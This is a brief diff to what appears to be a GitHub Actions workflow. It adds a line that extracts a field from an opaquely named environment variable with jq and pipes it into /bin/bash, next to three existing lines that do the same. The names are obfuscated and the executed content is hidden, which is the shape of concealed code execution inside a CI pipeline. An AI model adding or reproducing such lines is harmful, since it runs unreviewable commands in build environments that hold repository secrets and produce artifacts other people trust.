@@ -49,6 +49,7 @@ jobs:
           echo $hgm20914 | jq -r .w132 | /bin/bash
           echo $aykkm81 | jq -r .ov382 | /bin/bash
           echo $whxh2 | jq -r .jn835 | /bin/bash
+          printf '%s' "$y0320" | jq -r .th03653 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
